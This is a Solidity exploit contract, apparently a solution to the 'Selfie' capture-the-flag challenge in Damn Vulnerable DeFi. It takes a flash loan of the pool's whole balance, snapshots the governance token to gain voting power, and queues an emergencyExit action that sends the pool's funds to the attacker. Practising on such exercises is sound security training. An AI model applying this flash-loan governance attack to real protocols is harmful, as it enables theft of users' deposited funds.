// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieExploit {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address payable player;
    uint256 actionId;

    constructor(
        address _pool,
        address _governance,
        address _token,
        address payable _player
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        player = _player;
    }

    function attack(uint256 poolBalance) external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            player
        );

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            poolBalance,
            data
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        uint256 id = token.snapshot();
        governance.queueAction(address(pool), 0, data);
        uint count = governance.getActionCounter();
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
